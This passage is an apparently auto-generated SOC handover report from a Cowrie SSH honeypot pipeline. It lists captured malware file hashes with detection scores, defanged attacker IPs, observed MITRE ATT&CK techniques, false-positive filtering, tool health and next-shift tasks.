|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `198.12.149[.]130` | US | GoDaddy.com, LLC | **100** ⚠️ | 1 |
| `50.194.130[.]34` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 4 |
| `180.76.234[.]93` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 13 |
| `66.132.186[.]167` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `172.174.5[.]146` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `40.67.177[.]206` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `154.221.23[.]179` | HK | Yisu Cloud Ltd | **100** ⚠️ | 15 |
| `198.12.90[.]75` | US | Shaka Rover | **100** ⚠️ | 6 |
| `61.106.81[.]18` | KR | HVEunpyeong | **100** ⚠️ | 27 |
| `177.53.215[.]134` | EC | UNIVERSAL-STEREO C.L. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 22 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 54 cases |
| Tool 34  | Credential Extractor        | ✅ 18 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (11.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 16 recon entry/entries in table (4 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-19T23:06:51Z_
